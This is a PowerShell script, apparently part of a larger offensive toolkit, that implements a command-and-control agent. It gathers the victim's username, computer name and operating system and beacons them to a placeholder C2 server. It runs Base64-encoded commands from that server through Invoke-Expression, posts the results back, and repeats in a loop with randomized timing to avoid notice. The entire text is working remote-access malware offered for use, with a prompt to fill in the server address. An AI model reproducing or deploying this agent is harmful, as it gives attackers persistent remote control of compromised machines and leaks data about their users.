
# --- PART 2: THE C2 AGENT ---
$AgentId = "Agent_" + [System.Guid]::NewGuid().ToString().Substring(0,8)
$C2Url = "http://your-c2-server.com" # UPDATE THIS

while($true) {
    try {
        # 1. Collect Metadata
        $Info = @{
            Id   = $AgentId
            User = $env:USERNAME
            Host = $env:COMPUTERNAME
            OS   = (Get-WmiObject Win32_OperatingSystem).Caption
        }
        
        # 2. Beacon/Check-in
        $Payload = $Info | ConvertTo-Json
        $Response = Invoke-RestMethod -Uri "$C2Url/checkin" -Method Post -Body $Payload -ContentType "application/json" -ErrorAction Stop
        
        # 3. Task Execution
        if ($Response.command -and $Response.command -ne "sleep") {
            # Decode the command (assuming C2 sends Base64)
            $DecodedCmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Response.command))
            
            # Execute and capture output
            $Result = Invoke-Expression $DecodedCmd 2>&1 | Out-String
            
            # Send results back
            $OutData = @{ Id = $AgentId; Output = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Result)) } | ConvertTo-Json
            Invoke-RestMethod -Uri "$C2Url/results" -Method Post -Body $OutData -ContentType "application/json"
        }
    } catch {
        # Jitter on failure
    }
    
    # 4. Randomized Jitter (5-15 seconds)
    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
}